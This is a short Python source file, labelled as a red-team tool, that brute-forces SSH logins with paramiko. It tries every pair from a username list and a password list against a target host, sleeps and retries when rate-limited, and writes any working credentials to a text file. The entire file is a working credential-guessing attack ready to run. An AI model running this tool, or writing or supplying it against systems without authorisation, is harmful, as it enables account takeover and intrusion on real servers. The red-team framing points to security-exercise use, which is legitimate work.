import paramiko
import socket
import time


# Hannah Grape CDT Red Team Tool
# Takes in a list of usernames, passwords, and a host IP
# Returns true credentials to txt file

def is_ssh_open(ip, username, password):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to known hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=ip, username=username, password=password)
    except socket.timeout:
        # this is when host is unreachable
        print(f"IP: {ip} is unreachable, timed out.")
        return False
    except paramiko.AuthenticationException:
        print(f"Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"Testing limit exceeded, retrying...")
        # sleep for a minute
        time.sleep(60)
        return is_ssh_open(ip, username, password)
    else:
        # connection was established successfully
        print(f"Found combo:\n\tIP: {ip}\n\tUSERNAME: {username}\n\tPASSWORD: {password}")
        return True


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="SSH Password Tester.")
    parser.add_argument("ip", help="Hostname or IP Address of SSH Server to test.")
    parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
    parser.add_argument("-U", "--userlist", help="File that contain username list in each line.")

    # parse passed arguments
    args = parser.parse_args()
    ip = args.ip
    passlist = args.passlist
    userlist = args.userlist
    # read the file
    userlist = open(userlist).read().splitlines()
    passlist = open(passlist).read().splitlines()
    # test the users + passwords
    print("starting")
    for user in userlist:
        for password in passlist:
            if is_ssh_open(ip, user, password):
                # if combo is valid, save it to a file
                with open(f"credentials.txt", "a") as a_file:
                    a_file.write("\n")
                    a_file.write(f"{user}@{ip}:{password}")
                break
